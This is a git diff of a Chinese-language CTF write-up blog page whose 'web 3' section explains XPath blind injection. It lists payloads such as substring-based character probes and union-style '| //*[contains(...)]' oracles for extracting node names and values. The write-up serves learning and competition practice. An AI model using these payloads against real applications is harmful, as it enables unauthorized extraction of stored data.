@@ -104,7 +104,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/7678xml.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/xpath1.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/xpath2.PNG">
-<meta property="og:updated_time" content="2018-08-04T13:54:22.317Z">
+<meta property="og:updated_time" content="2018-08-18T10:30:44.105Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="isitdtuwp">
 <meta name="twitter:description" content="越南一个大学办的比赛">
@@ -348,9 +348,11 @@
 <h3 id="web-3"><a href="#web-3" class="headerlink" title="web 3"></a>web 3</h3><p>xpath注入 这玩意还第一次见</p>
 <p>思想类似 sql 盲注</p>
 <p><a href="https://www.cnblogs.com/bmjoker/p/8861927.html" target="_blank" rel="external">https://www.cnblogs.com/bmjoker/p/8861927.html</a><br><a href="http://www.mottoin.com/95785.html" target="_blank" rel="external">http://www.mottoin.com/95785.html</a></p>
-<p>本来应该先获取父结点的名字 然后分别获取 子结点的名字 子结点的值</p>
-<p>‘or substring(//user[1]/*[2],1,1)=’u’ or ‘a’=’a</p>
-<p>‘or substring(//user[1]/*[2]/text(),1,1)=’a’ or’a’=’a</p>
+<p>本来应该先获取父结点的名字 然后分别获取  </p>
+<p>子结点的名字</p>
+<p><code>&#39;or substring(name(//user[1]/*[2]),1,1)=&#39;u&#39; or &#39;a&#39;=&#39;a</code></p>
+<p>子结点的值</p>
+<p><code>&#39;or substring(//user[1]/*[2],1,1)=&#39;u&#39; or &#39;a&#39;=&#39;a</code><br>或者<br><code>&#39;or substring(//user[1]/*[2]/text(),1,1)=&#39;a&#39; or&#39;a&#39;=&#39;a</code></p>
 <p>类似这样 但这题不行</p>
 <p><code>&#39;and 1=0] | //*[contains(.,&#39;A&#39;)] | //*[&#39;1&#39;=&#39;0</code> 对</p>
 <p><code>&#39;and 1=0] | //*[contains(.,&#39;AD&#39;)] | //*[&#39;1&#39;=&#39;0</code> 错</p>
@@ -507,7 +509,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">66</span>
+                <span class="site-state-item-count">68</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
